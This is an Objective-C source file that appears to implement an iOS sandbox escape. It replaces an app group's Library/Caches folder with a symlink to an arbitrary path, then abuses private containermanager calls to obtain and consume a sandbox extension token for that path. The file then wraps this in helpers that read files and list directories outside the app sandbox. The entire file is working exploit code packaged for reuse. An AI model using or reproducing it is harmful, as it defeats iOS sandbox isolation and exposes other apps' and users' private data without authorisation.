#import "worse_query.h"
#import <dlfcn.h>
#import <unistd.h>

// ── containermanager 私有 API 签名 ──
typedef void *      (*fn_create)(void);
typedef void        (*fn_set_class)(void *, uint64_t);
typedef void        (*fn_set_group)(void *, void *);
typedef void        (*fn_set_flags)(void *, uint64_t);
typedef void        (*fn_set_part)(void *, uint64_t);
typedef void *      (*fn_get_result)(void *, void **);
typedef void        (*fn_free)(void *);
typedef void *      (*fn_copy_token)(void *, size_t *);
typedef int64_t     (*fn_consume)(const char *);
typedef void        (*fn_release)(int64_t);

static const uint64_t kClassAppGroup = 7;   // container_query_set_class
static const uint64_t kPartCaches     = 3;  // container_query_operation_set_part

// iOS 26/27 的 flag；26 用低位那套，27 用高位
static const uint64_t kFlagsDefault = 0x0000008000000000ULL;
static const uint64_t kFlagsIOS26   = 0x0000000800000000ULL;

static void *g_mgr = NULL;
static BOOL  g_loaded = NO;

static BOOL wq_load(void) {
    if (g_loaded) return g_mgr != NULL;
    g_loaded = YES;
    g_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                   RTLD_NOW | RTLD_LOCAL);
    if (!g_mgr) {
        // 26.x 上路径可能不同，退到镜像搜索
        g_mgr = dlopen("libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    }
    return g_mgr != NULL;
}

int64_t wq_acquire(NSString *target, NSString *group, BOOL altFlags, BOOL createDir) {
    if (target.length == 0 || group.length == 0) return -1;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *gRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
    if (!gRoot) return -1;

    if (!wq_load()) return -2;

    fn_create   qCreate = (fn_create)  dlsym(g_mgr, "container_query_create");
    fn_set_class qClass = (fn_set_class)dlsym(g_mgr, "container_query_set_class");
    fn_set_group qGroup = (fn_set_group)dlsym(g_mgr, "container_query_set_group_identifiers");
    fn_set_flags qFlags = (fn_set_flags)dlsym(g_mgr, "container_query_operation_set_flags");
    fn_set_part  qPart  = (fn_set_part) dlsym(g_mgr, "container_query_operation_set_part");
    fn_get_result qRes  = (fn_get_result)dlsym(g_mgr, "container_query_get_single_result");
    fn_free      qFree  = (fn_free)     dlsym(g_mgr, "container_query_free");
    fn_copy_token qTok  = (fn_copy_token)dlsym(g_mgr, "container_copy_sandbox_token");
    fn_consume   sCons  = (fn_consume)  dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

    if (!qCreate || !qClass || !qGroup || !qFlags || !qPart ||
        !qRes || !qFree || !qTok || !sCons) {
        return -2;
    }

    // ── 把 group 的 Library/Caches 换成指向 target 的符号链接 ──
    NSString *caches = [[gRoot URLByAppendingPathComponent:@"Library/Caches"] path];
    NSURL *linkURL = [NSURL fileURLWithPath:caches];

    // 先清掉原有内容
    [fm removeItemAtURL:linkURL error:nil];
    [fm createDirectoryAtPath:[caches stringByDeletingLastPathComponent]
  withIntermediateDirectories:YES attributes:nil error:nil];

    if (createDir) {
        [fm createDirectoryAtPath:target withIntermediateDirectories:YES
                       attributes:nil error:nil];
    }

    NSError *lerr = nil;
    BOOL ok = [fm createSymbolicLinkAtPath:caches withDestinationPath:target error:&lerr];
    if (!ok) {
        return -4;
    }

    // ── 查 containermanagerd 要 extension ──
    void *q = qCreate();
    if (!q) { [fm removeItemAtPath:caches error:nil]; return -3; }

    qClass(q, kClassAppGroup);

    // xpc_string 通过 libxpc C API 构造
    void *ident = NULL;
    {
        extern void *xpc_string_create(const char *);
        ident = xpc_string_create(group.UTF8String);
    }
    if (ident) qGroup(q, ident);

    qPart(q, kPartCaches);
    qFlags(q, altFlags ? kFlagsIOS26 : kFlagsDefault);

    void *err = NULL;
    void *result = qRes(q, &err);
    if (!result) {
        qFree(q);
        [fm removeItemAtPath:caches error:nil];
        return -5;
    }

    size_t tokLen = 0;
    void *tok = qTok(result, &tokLen);
    if (!tok || tokLen == 0) {
        qFree(q);
        [fm removeItemAtPath:caches error:nil];
        return -5;
    }

    const char *tokStr = (const char *)tok;
    int64_t handle = sCons(tokStr);

    free(tok);
    qFree(q);
    [fm removeItemAtPath:caches error:nil];

    if (handle < 0) return -6;
    return handle;
}

void wq_release(int64_t handle) {
    if (handle < 0) return;
    if (!wq_load()) return;
    fn_release r = (fn_release)dlsym(g_mgr, "sandbox_extension_release");
    if (!r) r = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (r) r(handle);
}

BOOL wq_with(NSString *target, NSString *group, void (^body)(void)) {
    int64_t h = wq_acquire(target, group, NO, NO);
    if (h < 0) {
        // 26.x 换 flag 再试一次
        h = wq_acquire(target, group, YES, NO);
        if (h < 0) return NO;
    }
    body();
    wq_release(h);
    return YES;
}

NSData *wq_read(NSString *path, NSString *group) {
    __block NSData *out = nil;
    NSString *dir = [path stringByDeletingLastPathComponent];
    wq_with(dir, group, ^{
        out = [NSData dataWithContentsOfFile:path];
    });
    if (!out) out = [NSData dataWithContentsOfFile:path];
    return out;
}

NSArray<NSString *> *wq_list(NSString *dir, NSString *group) {
    __block NSArray *out = nil;
    wq_with(dir, group, ^{
        out = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
    });
    if (!out) {
        out = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
    }
    return out ?: @[];
}
